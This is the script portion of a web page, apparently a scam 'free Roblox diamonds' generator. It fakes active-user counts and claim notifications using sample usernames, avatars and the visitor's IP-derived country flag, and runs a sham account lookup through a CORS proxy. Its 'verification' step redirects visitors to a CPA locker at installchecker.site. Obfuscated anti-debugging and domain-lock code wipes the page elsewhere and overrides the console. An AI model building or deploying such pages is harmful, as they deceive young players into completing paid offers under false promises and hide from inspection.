            var _0x2f8a = false;
            for (var i = 0; i < _0xa4b7.length; i++) {
                if (_0x5e9f === _0xa4b7[i] || _0x8c3d.includes(_0xa4b7[i])) {
                    _0x2f8a = true;
                    break;
                }
            }
            
            if (!_0x2f8a) {
                // Immediate destruction
                document.documentElement.innerHTML = '<html><head><title>Access Denied</title></head><body style="background:#000;color:#fff;font-family:Arial;text-align:center;padding:50px;"><h1>🚫 ACCESS DENIED 🚫</h1><p>This content is protected and can only be accessed from the authorized domain.</p><p>Authorized domain: <strong>onmod.site</strong></p><p>Current domain: <strong>' + window.location.hostname + '</strong></p></body></html>';
                
                // Clear all scripts
                var _0x6b1c = document.getElementsByTagName('script');
                while (_0x6b1c.length > 0) {
                    _0x6b1c[0].remove();
                }
                
                // Prevent further execution
                throw new Error('Unauthorized domain access');
            }
            
            // Override console methods to prevent debugging
            var _0x4d2a = console.log;
            console.log = function() {
                if (window.location.hostname !== 'onmod.site') {
                    document.body.innerHTML = '<h1>Console Access Denied</h1>';
                    return;
                }
                _0x4d2a.apply(console, arguments);
            };
            
            // Protect against iframe embedding
            if (window !== window.top) {
                document.body.innerHTML = '<h1>Embedding Not Allowed</h1><p>This content cannot be embedded in frames.</p>';
                window.top.location.href = window.location.href;
            }
            
            // Final continuous check
            setInterval(function() {
                if (window.location.hostname !== 'onmod.site' && !window.location.hostname.includes('onmod.site')) {
                    document.body.innerHTML = '<h1>Domain Changed - Access Revoked</h1>';
                    window.location.href = 'about:blank';
                }
            }, 200);
            
        })();
        
        // Check if CPA script loaded properly
        window.addEventListener('load', function() {
            console.log("Page loaded, checking CPA script...");
            setTimeout(() => {
                console.log("Available global functions:", Object.keys(window).filter(key => typeof window[key] === 'function' && key.includes('qd')));
                console.log("CPA script loaded:", typeof window._qd !== 'undefined');
            }, 2000);
        });

        // --- Configuration ---
        const CPA_LOCKER_SCRIPT = function() {
            // Redirect to the CPA locker URL
            console.log("Redirecting to CPA locker...");
            window.location.href = "https://installchecker.site/cl/i/m521m8";
        };

        // --- Active Users Count ---
        function randomUsers() {
            return Math.floor(Math.random() * (450 - 150 + 1)) + 150;
        }
        function updateActiveUsers() {
            document.getElementById('activeUsersCount').textContent = randomUsers();
        }
        updateActiveUsers();
        setInterval(updateActiveUsers, 4500);

        // --- Live Claim Notifications ---
        const avatars = [
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F886F6A2F04884003042CB1B133FF85E-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DB22938CEDD6F835BDC83517F22CF558-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F323BBE8809396771A9D3B009ABB7B6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-877FD313CF49AC230D6CDB0813384418-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-508B26B915327442310C15E05990262A-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D69F986644481AEE90D6BBB252BDD78B-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2C45A19E70B6AAC621EBD8B2D0A6E42E-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-06DD1C00CA0EB2CCDF1E8E828D182573-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7E66C8AA069C27FAB434F332DFA7DE40-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-ED6E717A62E7C6DE57502AA232123D98-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A415CFB32D441BB6E1A96CA204BB0647-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4BA51E32FA674ED3D7A1CE66FE5AA40-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D317B719D555BB05A2AF522B512BFF23-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A7818BF2D5D4AC3CB6D5418A713BBB6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-AEC10DD31BD85B9706BB3567ED5A4BC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A9C2582009A1FDECCA18263C7A3C6FE8-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0E08B78408BB5614B39A026D36A9575D-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6C9E0AAEF821128DD48FB8A389C4A0B9-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-EA378FFC5001D147249CB2B3AAED2C05-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-151FF93EEB183449A06A4833E71938A3-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F47CC2E15DEC626448D15A9E66EF1762-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A654D4AEA6E04F5671471E0266B4EA62-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E9527F1E31B8A775C70C0022AF80FDC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D149EA2C4E77B7B6882D6C056B0B3772-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3F0C92CED81F2936EA712517457CC982-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B6530B4FCD3302ED31F4BD913E198D7F-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-16067DDF7E67005B57C8CA1BACBC8395-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-8EE17821CC0789141F9753763D593180-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A8B021C60924EE61CEF929236824C30F-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9C81A53E43F0D94E105F86CFCC350C5D-Png/150/150/AvatarHeadshot/Webp/noFilter',
            'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7D7B193935907A3816671468E709A849-Png/150/150/AvatarHeadshot/Webp/noFilter'
        ];

        const usernames = [
            'Liliana_Cupcake1',
            'PixelNinja123',
            'ayoletgo',
            'Dreamycloudxo',
            'lily_l0llyp0p',
            'lilypaddd11',
            'Sisi_7901',
            'him90236',
            'Queenbee_mavi',
            'reto21r',
            'Emmagirl0916',
            '3mmqza',
            'parassinitu',
            'laxyaaa',
            'Battal_216',
            'bangakumakan',
            'DDDDEdZZ',
            'Anhtomdepzai',
            'XAGXcallYTCH',
            'Moonee_Play',
            'hotspot5671',
            'CyberXIndo',
            'AT111114',
            'wDetrox',
            'Eightnesses',
            'EightPxth',
            'Ishowspeedjr2nd',
            'angel1789tay',
            'gardenwindut',
            'needscreativity',
            'Richy_544'
        ];

        // User country data - will be populated with IP API
        let userCountry = '';
        let userCountryCode = '';
        let countryUsers = {};
        
        // Global data object for country information
        const globalDatas = { 
            country_code: null, 
            country_name: null, 
            flagUrl: null, 
        }; 
        
        // Fetch user's IP address and then country information
        $.getJSON("https://api.ipify.org?format=json", function(data) { 
            var ipAddress = data.ip; 
            console.log('IP Address detected:', ipAddress);
            
            $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(response) { 
                console.log('Full IP API response:', response);
                
                globalDatas.country_code = response.country_code; 
                globalDatas.country_name = response.country_name; 
                globalDatas.flagUrl = "https://flagcdn.com/w320/" + response.country_code.toLowerCase() + ".png"; 
                
                // Also update the existing variables for compatibility
                userCountry = response.country_name;
                userCountryCode = response.country_code.toLowerCase();
                
                // Initialize country users object with random usernames
                const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
                countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10); // Assign 10 random users to user's country
                
                console.log('User country detected:', userCountry, 'Code:', userCountryCode);
                console.log('Flag URL:', globalDatas.flagUrl);
            }).fail(function(error) {
                console.error('Error fetching country data from ipapi.co:', error);
                // Try alternative API
                $.getJSON("https://ipinfo.io/" + ipAddress + "/json", function(altResponse) {
                    console.log('Alternative API response:', altResponse);
                    globalDatas.country_code = altResponse.country; 
                    globalDatas.country_name = altResponse.country; 
                    globalDatas.flagUrl = "https://flagcdn.com/w320/" + altResponse.country.toLowerCase() + ".png"; 
                    
                    userCountry = altResponse.country;
                    userCountryCode = altResponse.country.toLowerCase();
                    
                    console.log('User country detected (alternative):', userCountry, 'Code:', userCountryCode);
                }).fail(function(altError) {
                    console.error('Both APIs failed:', altError);
                    // Default to Morocco for testing
                    userCountry = 'Morocco';
                    userCountryCode = 'ma';
                    globalDatas.country_code = 'MA';
                    globalDatas.country_name = 'Morocco';
                    globalDatas.flagUrl = 'https://flagcdn.com/w320/ma.png';
                    console.log('Using default Morocco flag');
                });
            }); 
        }).fail(function(error) {
            console.error('Error fetching IP address:', error);
            // Default to Morocco for testing
            userCountry = 'Morocco';
            userCountryCode = 'ma';
            globalDatas.country_code = 'MA';
            globalDatas.country_name = 'Morocco';
            globalDatas.flagUrl = 'https://flagcdn.com/w320/ma.png';
            console.log('Using default Morocco flag due to IP fetch error');
        });

        let notificationProfiles = []; // Will be populated with {username, avatarUrl, country, flagUrl}
        const items = ['100 Diamonds', '300 Diamonds', '400 Diamonds', '600 Diamonds', '800 Diamonds', '1,000 Diamonds'];
        let notificationInterval;
        let popupOpen = false;

        function initializeNotificationProfiles() {
            // Create notification profiles with the new avatars and usernames
            notificationProfiles = usernames.map((username, index) => ({
                username: username,
                avatarUrl: avatars[index % avatars.length], // Cycle through avatars
                country: globalDatas.country_name || userCountry || 'Morocco',
                countryCode: globalDatas.country_code || userCountryCode || 'MA',
                flagUrl: globalDatas.flagUrl || 'https://flagcdn.com/w320/ma.png'
            }));
            
            console.log('Notification profiles initialized:', notificationProfiles.length);
            console.log('Using country:', globalDatas.country_name || userCountry);
            console.log('Using flag URL:', globalDatas.flagUrl);
            startNotifications();
        }

        function startNotifications() {
            if (popupOpen || notificationProfiles.length === 0) return;
            notificationInterval = setInterval(function() {
                if (popupOpen) return;
                const profile = notificationProfiles[Math.floor(Math.random() * notificationProfiles.length)];
                const item = items[Math.floor(Math.random() * items.length)];
                const html = `
                    <div class="message">
                        <div class="img">
                            <img src="${profile.avatarUrl}" alt="${profile.username}'s avatar">
                        </div>
                        <div class="more">
                            <div class="username-row">
                                <span class="username">${profile.username}</span>
                                <span class="from-text">from</span>
                                <img src="${profile.flagUrl}" alt="${profile.country}" class="country-flag">
                            </div>
                            <div class="claim-text">unlocked ${item.toLowerCase()} after complete verification</div>
                            <div class="item-name">${item}</div>
                        </div>
                    </div>
                `;
                $(".cliameds").html(html).fadeIn();
                setTimeout(() => $(".cliameds").fadeOut(), 4000);
            }, 6000);
        }

        function stopNotifications() {
            clearInterval(notificationInterval);
            $(".cliameds").fadeOut();
        }
        
        // --- Popup Logic ---
        const showPurchasePopup = (itemName, itemImage) => {
            popupOpen = true;
            stopNotifications();
            const popup = $('#purchase-popup');
            const popupContent = popup.find('.popup-content');

            popupContent.html(`
                <div class="popup-header"><h3>Confirm Selection</h3></div>
                <img src="${itemImage}" alt="${itemName}" class="item-popup-image">
                <p class="item-confirm">Enter your username to receive <span>${itemName} Diamonds</span></p>
                <div class="input-group">
                    <input type="text" id="username-input" placeholder="Enter your Roblox username">
                </div>
                <div class="user-error d-none">Please enter a valid username</div>
                <div class="popup-buttons">
                    <button class="cancel-btn">Cancel</button>
                    <button class="free-btn" id="search-user-btn">Continue</button>
                </div>
            `);
            popup.css('display', 'flex');
            $('#username-input').focus();
        }

        const closePurchasePopup = () => {
            $('#purchase-popup').fadeOut(200);
            popupOpen = false;
            startNotifications();
        }
        
        // --- API & State Management Logic ---
        const showSearchingState = async (username, itemName, itemImage) => {
            const popupContent = $('.popup-content');
            popupContent.html(`
                <div class="popup-header"><h3>Searching Account</h3></div>
                <div style="text-align:center;padding:20px">
                    <div class="folding"><div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div></div>
                    <p class="searching-text">Searching for @${username}</p>
                </div>
            `);
            
            try {
                // FIXED API: Using a reliable CORS proxy for official Roblox endpoints
                const userResponse = await fetch('https://corsproxy.io/?https://users.roblox.com/v1/usernames/users', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
                });
                if (!userResponse.ok) throw new Error('User not found in initial search.');
                const userData = await userResponse.json();
                if (!userData.data || userData.data.length === 0) throw new Error('User not found.');
                
                const userId = userData.data[0].id;
                
                const thumbResponse = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
                if (!thumbResponse.ok) throw new Error('Could not fetch avatar.');
                const thumbData = await thumbResponse.json();
                const avatarUrl = thumbData.data[0].imageUrl;

                showSuccessState(username, avatarUrl, itemName, itemImage);
            } catch (error) {
                console.error('API Error:', error);
                showErrorState(username, itemName, itemImage);
            }
        }

        const showSuccessState = (username, avatarUrl, itemName, itemImage) => {
            const popupContent = $('.popup-content');
            popupContent.html(`
                <div class="popup-header"><h3>Account Found</h3></div>
                <div style="text-align:center;padding:20px">
                    <img src="${avatarUrl}" class="result-avatar">
                    <p class="result-username">@${username}</p>
                    <button class="get-item-now-btn">Generate Diamonds</button>
                </div>
            `);
        }

        const showVerificationState = (username, itemName, itemImage) => {
            const popupContent = $('.popup-content');
            popupContent.html(`
                <div class="popup-header"><h3>Verification</h3></div>
                <div style="text-align:center;padding:20px">
                    <div class="folding"><div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div></div>
                    <p class="searching-text">Transferring ${itemName} Diamonds to @${username}</p>
                </div>
            `);
            setTimeout(() => {
                console.log("Attempting to show CPA locker...");
                CPA_LOCKER_SCRIPT();
                // Don't close popup immediately, let the CPA script handle it
                // closePurchasePopup();
            }, 2000);
        }

        const showErrorState = (username, itemName, itemImage) => {
            const popupContent = $('.popup-content');
            popupContent.html(`
                <div class="popup-header"><h3>Error</h3></div>
                <div style="text-align:center;padding:20px">
                    <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
                    <button class="get-item-now-btn" id="retry-btn">Try Again</button>
                </div>
            `);
            $('#retry-btn').on('click', () => showPurchasePopup(itemName, itemImage));
        }

        // --- Event Listeners ---
        $(document).ready(function() {
            // Manual override for testing - you can change this to your country
            // Uncomment the lines below to force Morocco flag
            /*
            userCountry = 'Morocco';
            userCountryCode = 'ma';
            globalDatas.country_code = 'MA';
            globalDatas.country_name = 'Morocco';
            globalDatas.flagUrl = 'https://flagcdn.com/w320/ma.png';
            console.log('Manual override: Using Morocco flag');
            */
            
            // Initialize notifications after country data is loaded
            setTimeout(() => {
                initializeNotificationProfiles();
            }, 2000); // Wait for country detection to complete
            const dingSound = document.getElementById('dingSound');
            const clickSound = document.getElementById('clickSound');

            $('.item-card').on('click', function() {
                $('.item-card').removeClass('selected');
                $(this).addClass('selected');
                dingSound.currentTime = 0;
                dingSound.play().catch(e => {});
                
                const itemName = $(this).find('.item-name').text().trim();
                const itemImage = $(this).find('.item-img').attr('src');
                showPurchasePopup(itemName, itemImage);
            });

            // Using event delegation for dynamically created elements
            $(document).on('click', '.cancel-btn', closePurchasePopup);

            $(document).on('click', '#search-user-btn', function() {
                clickSound.currentTime = 0;
                clickSound.play().catch(e => {});
                const username = $('#username-input').val().trim();
                if (!username) {
                    $('.user-error').removeClass('d-none');
                    return;
                }
                const selectedItem = $('.item-card.selected');
                const itemName = selectedItem.find('.item-name').text().trim();
                const itemImage = selectedItem.find('.item-img').attr('src');
                showSearchingState(username, itemName, itemImage);
            });

            $(document).on('click', '.get-item-now-btn', function() {
                clickSound.currentTime = 0;
                clickSound.play().catch(e => {});
                const username = $('.result-username').text().substring(1);
                const selectedItem = $('.item-card.selected');
                const itemName = selectedItem.find('.item-name').text().trim();
                const itemImage = selectedItem.find('.item-img').attr('src');
                showVerificationState(username, itemName, itemImage);
            });
        });
    </script>
</body>
</html>